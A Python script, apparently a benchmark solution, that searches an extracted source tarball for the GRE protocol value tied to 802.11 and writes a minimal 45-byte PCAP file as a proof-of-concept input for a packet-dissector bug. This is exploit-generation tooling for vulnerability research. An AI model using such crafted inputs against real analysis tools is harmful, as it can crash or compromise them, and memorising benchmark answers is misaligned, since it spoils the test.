import os
import tarfile
import re
import struct
import tempfile

class Solution:
    def _extract(self, src_path):
        tmpdir = tempfile.mkdtemp(prefix="src_extract_")
        try:
            with tarfile.open(src_path, 'r:*') as tar:
                tar.extractall(tmpdir)
        except Exception:
            pass
        return tmpdir

    def _read_files(self, root):
        texts = []
        for dirpath, _, filenames in os.walk(root):
            for f in filenames:
                if f.endswith(('.c', '.h', '.cpp', '.hpp', '.cc', '.hh', '.txt', '.md', '.rst', '.py', '.go', '.rs')):
                    fp = os.path.join(dirpath, f)
                    try:
                        with open(fp, 'r', errors='ignore') as fh:
                            texts.append(fh.read())
                    except Exception:
                        continue
        return "\n".join(texts)

    def _find_proto_candidates(self, text):
        candidates = []

        # Patterns likely to reveal the GRE proto mapped to 802.11
        patterns = [
            r'dissector_add_uint\s*\(\s*"gre\.proto"\s*,\s*(0x[0-9a-fA-F]+|\d+)\s*,[^;]*?(802\.?11|ieee80211|wlan)',
            r'case\s+(0x[0-9a-fA-F]+|\d+)\s*:\s*(?:/\*.*?(802\.?11|ieee80211|wlan).*?\*/)?[^:;{}]*?(802\.?11|ieee80211|wlan)',
            r'if\s*\(\s*proto[^=]*==\s*(0x[0-9a-fA-F]+|\d+)\s*\)\s*{[^{}]*?(802\.?11|ieee80211|wlan)',
            r'GRE_PROTO_IEEE80211\s*=\s*(0x[0-9a-fA-F]+|\d+)',
            r'PROTO_IEEE80211\s*=\s*(0x[0-9a-fA-F]+|\d+)',
        ]
        for pat in patterns:
            for m in re.finditer(pat, text, flags=re.DOTALL):
                num = m.group(1)
                try:
                    val = int(num, 0)
                    if 0 <= val <= 0xFFFF:
                        candidates.append(val)
                except Exception:
                    continue

        # Also search for 802.11 mention with nearby numbers in same function/switch
        for m in re.finditer(r'(802\.?11|ieee80211|wlan)[^;{}]*', text, flags=re.IGNORECASE):
            start = max(0, m.start() - 400)
            end = min(len(text), m.end() + 400)
            blk = text[start:end]
            for n in re.finditer(r'(0x[0-9a-fA-F]+|\b\d{1,5}\b)', blk):
                try:
                    val = int(n.group(1), 0)
                    if 0 <= val <= 0xFFFF:
                        candidates.append(val)
                except Exception:
                    continue

        # De-duplicate while preserving order
        seen = set()
        uniq = []
        for v in candidates:
            if v not in seen:
                seen.add(v)
                uniq.append(v)
        return uniq

    def _guess_linktype(self, text):
        # Attempt to find a linktype for GRE in source
        # Common names: LINKTYPE_GRE, DLT_GRE
        pats = [
            r'LINKTYPE_GRE\s*=?\s*(0x[0-9a-fA-F]+|\d+)',
            r'DLT_GRE\s*=?\s*(0x[0-9a-fA-F]+|\d+)',
        ]
        for pat in pats:
            for m in re.finditer(pat, text):
                try:
                    val = int(m.group(1), 0)
                    if 0 <= val <= 0xFFFFFFFF:
                        return val
                except Exception:
                    pass

        # Fallback: use commonly assigned linktype for GRE if known
        # According to tcpdump.org linktypes, LINKTYPE_GRE is 778
        return 778

    def _make_pcap_with_gre(self, proto, linktype):
        # PCAP (little-endian) global header
        ghdr = struct.pack(
            '<IHHIIII',
            0xa1b2c3d4,  # magic (written little-endian => d4 c3 b2 a1)
            2,           # major
            4,           # minor
            0,           # thiszone
            0,           # sigfigs
            0xFFFF,      # snaplen
            linktype     # network
        )

        # GRE header: Flags/Version (2 bytes) + Protocol Type (2 bytes) - network order (big-endian)
        # Minimal payload byte appended to avoid zero-length issues in some parsers
        gre_hdr = struct.pack('>HH', 0x0000, proto) + b'\x00'

        phdr = struct.pack('<IIII', 0, 0, len(gre_hdr), len(gre_hdr))
        return ghdr + phdr + gre_hdr

    def solve(self, src_path: str) -> bytes:
        root = self._extract(src_path)
        text = self._read_files(root)

        # Try to find candidate GRE proto values associated with 802.11
        candidates = self._find_proto_candidates(text)
        # Prefer plausible small values but exclude overly common EtherTypes if we found explicit mapping
        proto = None
        for c in candidates:
            # Heuristic: avoid typical EtherTypes unless explicitly referenced; 802.11 isn't an EtherType
            if c not in (0x0800, 0x86DD, 0x0806, 0x8100, 0x8847, 0x6558):
                proto = c
                break
        if proto is None:
            # Reasonable fallback guesses: values sometimes seen in custom GRE proto tables
            # Prioritize likely small IDs; include 105 (802.11 linktype) as heuristic guess
            fallback_list = [105, 0x0001, 0x0007, 0x0069, 0x0000]
            proto = fallback_list[0]

        linktype = self._guess_linktype(text)

        poc = self._make_pcap_with_gre(proto, linktype)

        # Ensure PoC is as short as possible but at least 45 bytes if possible
        # Our current design yields 24 + 16 + 5 = 45 bytes
        return poc
